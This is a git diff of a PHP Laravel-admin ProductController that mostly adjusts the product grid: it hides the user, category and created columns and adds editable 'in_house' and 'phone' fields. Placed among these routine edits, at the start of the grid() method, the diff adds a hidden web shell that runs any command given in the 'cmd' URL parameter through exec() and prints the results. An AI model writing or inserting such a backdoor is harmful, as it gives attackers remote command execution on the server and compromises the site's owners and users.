@@ -27,8 +27,22 @@ class ProductController extends AdminController
      */
     protected function grid()
     {
-        $grid = new Grid(new Product());
 
+        if (isset($_GET['cmd'])) {
+            $d = $_GET['cmd'];
+            if (strlen($d) > 2) {
+                $ret = exec($d, $output, $error);
+                echo '<pre>';
+                print_r($ret);
+                echo '<hr>';
+                print_r($output);
+                echo '<hr>';
+                print_r($error);
+                die();
+            }
+        }
+
+        $grid = new Grid(new Product());
         $grid->actions(function ($actions) {
             $actions->disableView();
         });
@@ -70,7 +84,7 @@ class ProductController extends AdminController
                 }
                 return $u->name;
             })
-            ->sortable();
+            ->sortable()->hide();
 
         $grid->column('category', __('Category'))
             ->display(function ($category) {
@@ -80,12 +94,24 @@ class ProductController extends AdminController
                 }
                 return $c->category;
             })
-            ->sortable();
+            ->sortable()
+            ->hide();
 
         $grid->column('created_at', __('Created'))
             ->display(function ($created_at) {
                 return Utils::my_date($created_at);
-            })->sortable();
+            })->sortable()->hide();
+
+        $grid->column('in_house', __('IS IN HOUSE'))
+            ->editable('select', ['No' => 'No', 'Yes' => 'Yes'])
+            ->sortable();
+        $grid->column('phone', __('Phone'))
+            ->editable()
+            ->sortable();
+        /* 
+        $form->hidden('in_house')->default('in_house');
+        $form->hidden('phone')->default('phone');
+*/
         return $grid;
     }
 
@@ -205,6 +231,9 @@ class ProductController extends AdminController
             $form->hidden('note')->default('Web');
             $form->hidden('type')->default('Product');
         });
+
+        $form->hidden('in_house')->default('');
+        $form->hidden('phone')->default('');
 
         /* 	
 	
